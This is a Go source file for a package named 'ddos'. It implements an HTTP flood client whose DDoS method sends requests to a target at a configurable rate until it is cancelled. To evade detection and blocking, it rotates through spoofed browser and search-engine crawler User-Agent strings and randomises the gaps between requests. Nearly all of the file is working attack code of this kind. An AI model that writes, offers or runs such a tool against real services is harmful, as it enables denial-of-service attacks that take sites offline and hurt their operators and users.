package ddos

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
)

type Client struct {
	HTTPClient *http.Client
	UserAgents []string

	Retries        int
	retriesCounter int
}

func NewClient(timeout time.Duration, retries int) (*Client, error) {
	var c Client

	c.HTTPClient = &http.Client{
		Timeout: timeout,
	}
	c.UserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
		"Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/604.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
		"Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.17763",
	}
	c.Retries = retries
	c.retriesCounter = 0

	return &c, nil
}

type RequestGenerator func(ctx context.Context) (*http.Request, error)

func (c *Client) DDoS(ctx context.Context, requestGenerator RequestGenerator, rate int) error {
	pingErrc := make(chan error, 1)
	delay := time.Second / time.Duration(rate)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case err := <-pingErrc:
			if c.retriesCounter < c.Retries {
				c.retriesCounter++
				log.Printf("Retry %d, after error: %v", c.retriesCounter, err)
			} else {
				return err
			}
		default:
			req, err := requestGenerator(ctx)
			if err != nil {
				return fmt.Errorf("error generating request: %v", err)
			}

			// Randomize User-Agent
			req.Header.Set("User-Agent", c.GetRandomUserAgent())

			go c.ping(pingErrc, req)

			// Randomize sleep time in range 50%-150% of the requested delay
			time.Sleep(delay/2 + time.Duration(rand.Intn(int(delay))))
		}
	}
}

func (c *Client) GetRandomUserAgent() string {
	return c.UserAgents[rand.Intn(len(c.UserAgents))]
}

func (c *Client) ping(errc chan<- error, req *http.Request) {
	res, err := c.HTTPClient.Do(req)
	if err != nil {
		errc <- fmt.Errorf("error sending request: %v", err)
		return
	}
	defer res.Body.Close()

	if res.StatusCode >= 400 {
		errc <- fmt.Errorf("%s %s => %s", req.Method, req.URL, res.Status)
		return
	}

	// Reset retries counter on success
	c.retriesCounter = 0

	log.Printf("%s %s => %s", req.Method, req.URL, res.Status)
}
